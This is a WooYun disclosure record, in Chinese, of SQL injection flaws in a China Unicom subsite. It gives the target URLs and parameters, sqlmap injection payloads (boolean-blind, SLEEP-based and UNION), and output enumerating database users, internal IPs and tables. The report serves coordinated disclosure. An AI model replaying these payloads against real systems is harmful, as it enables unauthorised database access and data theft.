wybug_title: 中国联通某分站SQL注入漏洞
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2014-07-30：	细节已通知厂商并且等待厂商处理中									2014-08-04：	厂商已经确认，细节仅向厂商公开									2014-08-14：	细节向核心白帽子及相关领域专家公开									2014-08-24：	细节向普通白帽子公开									2014-09-03：	细节向实习白帽子公开									2014-09-13：	细节向公众公开  简要描述： 联通某手机应用 详细说明：  此站点有2个漏洞一并汇报均为root权限注入点1为post类型http://3g.169ol.com/wdfsearch.psml  data：level=0-%E5%85%A8%E9%83%A8&search=1注入点2为get型http://3g.169ol.com/spbrief.psml?sp_parentcode=06   漏洞证明：  http://3g.169ol.com/wdfsearch.psml证明
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: search    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: level=0-%E5%85%A8%E9%83%A8&search=1%' AND 8525=8525 AND '%'='    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: level=0-%E5%85%A8%E9%83%A8&search=1%' AND SLEEP(5) AND '%'='---[20:58:06] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, JSPback-end DBMS: MySQL 5.0.11[20:58:06] [INFO] fetching database users[20:58:06] [INFO] fetching number of database users[20:58:06] [INFO] resumed: 6[20:58:06] [INFO] resumed: 'root'@'localhost'[20:58:06] [INFO] resumed: 'root'@'sc200'[20:58:06] [INFO] resumed: 'root'@'127.0.0.1'[20:58:06] [INFO] resumed: 'debian-sys-maint'@'localhost'[20:58:06] [INFO] resumed: 'back201'@'192.168.50.201'[20:58:06] [INFO] resumed: 'root'@'%'database management system users [6]:[*] 'back201'@'192.168.50.201'[*] 'debian-sys-maint'@'localhost'[*] 'root'@'%'[*] 'root'@'127.0.0.1'[*] 'root'@'localhost'[*] 'root'@'sc200'[20:58:06] [INFO] fetching database names[20:58:06] [INFO] fetching number of databases[20:58:06] [INFO] resumed: 4[20:58:06] [INFO] resumed: information_schema[20:58:06] [INFO] resumed: mysql[20:58:06] [INFO] resumed: scportal[20:58:06] [INFO] resumed: testavailable databases [4]:[*] information_schema[*] mysql[*] scportal[*] test



---Place: GETParameter: sp_parentcode    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: sp_parentcode=06' AND 2579=2579 AND 'eGbT'='eGbT    Type: UNION query    Title: MySQL UNION query (NULL) - 11 columns    Payload: sp_parentcode=06' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716f717371,0x614d59777963436a754e,0x71626d6371),NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: sp_parentcode=06' AND SLEEP(5) AND 'SaMU'='SaMU---[20:52:01] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, JSPback-end DBMS: MySQL 5.0.11[20:52:01] [INFO] fetching database namesavailable databases [4]:[*] information_schema[*] mysql[*] scportal[*] test[20:52:01] [WARNING] missing table parameter, sqlmap will retrieve the number of entries for all database management system databases' tables[20:52:01] [INFO] fetching tables for databases: 'information_schema, mysql, scportal, test'[20:52:01] [WARNING] reflective value(s) found and filtering outDatabase: test+---------------------------------------+---------+| Table                                 | Entries |+---------------------------------------+---------+| test                                  | 1       |+---------------------------------------+---------+Database: scportal+---------------------------------------+---------+| Table                                 | Entries |+---------------------------------------+---------+| zjdl                                  | 48612   || sichuantongji                         | 13094   |


   修复方案：  过滤参数   版权声明：转载请注明来源 Manning@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-08-04 09:54 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT直接通报中国联通集团公司处置。 最新状态： 暂无
